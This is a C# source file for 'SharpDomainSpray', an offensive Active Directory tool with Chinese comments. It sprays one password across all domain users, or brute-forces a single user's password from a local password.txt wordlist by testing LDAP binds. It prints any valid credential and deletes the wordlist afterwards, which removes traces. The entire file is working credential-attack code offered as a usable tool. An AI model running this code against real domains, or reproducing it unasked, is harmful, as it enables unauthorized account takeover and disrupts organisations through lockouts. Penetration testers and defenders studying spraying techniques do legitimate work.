using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Text;

namespace SharpDomainSpray
{
    class MainClass
    {
        /// <summary>
        /// 利用 NativeObject 接口判断账号密码是否正确
        /// </summary>
        /// <param name="userName">用户</param>
        /// <param name="password">密码</param>
        /// <param name="domain">域名</param>
        /// <returns></returns>
        public static bool Authenticate(string userName, string password, string domain)
        {
            bool authentic = false;
            try
            {
                DirectoryEntry entry = new DirectoryEntry("LDAP://" + domain, userName, password);
                object nativeObject = entry.NativeObject;
                authentic = true;
            }
            catch (DirectoryServicesCOMException) { }
            return authentic;
        }

        /// <summary>
        /// 指定单个密码匹配域内用户
        /// </summary>
        /// <param name="password"></param>
        /// <param name="domain"></param>
        public static void Pass2User(string password, string domain)
        {
            foreach (string userName in DomainUserList.Users())
            {
                if (Authenticate(userName, password, domain))
                {
                    count++;
                    Console.WriteLine("  [>] User: " + userName + " Password is: " + password);
                }
            }
            Console.WriteLine("Count: " + count);

        }

        /// <summary>
        /// 爆破指定域用户密码
        /// </summary>
        /// <param name="userName"></param>
        /// <param name="domain"></param>
        public static void User2Pass(string userName, string domain)
        {
            string currentDirectory = Environment.CurrentDirectory;
            string text = currentDirectory + @"\password.txt";
            if (!File.Exists(text))
            {
                Console.WriteLine("File not found " + text);
            }
            else
            {
                FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read);
                try
                {
                    StreamReader streamReader = new StreamReader(fileStream, Encoding.Default);
                    try
                    {
                        while (!streamReader.EndOfStream)
                        {
                            string password;
                            if ((password = streamReader.ReadLine()) != null && password.Length != 0)
                            {
                                if (Authenticate(userName, password, domain))
                                {
                                    Console.WriteLine("  [>] User: " + userName + " Password is: " + password);
                                    ((IDisposable)fileStream).Dispose();
                                    File.Delete(text);
                                    Console.WriteLine("Finish!");
                                    Environment.Exit(0);
                                }
                            }
                        }
                    }
                    finally
                    {
                        if (streamReader != null)
                        {
                            ((IDisposable)streamReader).Dispose();
                        }
                    }
                }
                finally
                {
                    if (fileStream != null)
                    {
                        ((IDisposable)fileStream).Dispose();
                    }
                }
                File.Delete(text);
                Console.WriteLine("Finish!");

            }
        }

        public static int count = 0;
        public static void Main(string[] args)
        {
            Console.WriteLine("\r\n############## SharpDomainSpray Code By RcoIl ############## \r\n");
            Domain domain = Domain.GetCurrentDomain();
            if (args.Contains("-Pass2User"))
            {
                string password = args[1];
                Console.WriteLine("  [+] 指定单个密码，枚举域内用户进行验证");
                Console.WriteLine("  [*] 正在验证密码: {0} 对应的用户....", password);
                Console.WriteLine();
                Pass2User(password, domain.ToString());
            }
            else if (args.Contains("-User2Pass"))
            {
                string userName = args[1];
                Console.WriteLine("  [+] 指定单个用户，读取 password.txt 内容进行密码验证");
                Console.WriteLine("  [*] 正在验证 {0} 用户密码....", userName);
                Console.WriteLine();
                User2Pass(userName, domain.ToString());
            }
            else
            {
                Console.WriteLine("Error: Not enough arguments. ");
            }
        }
    }
}
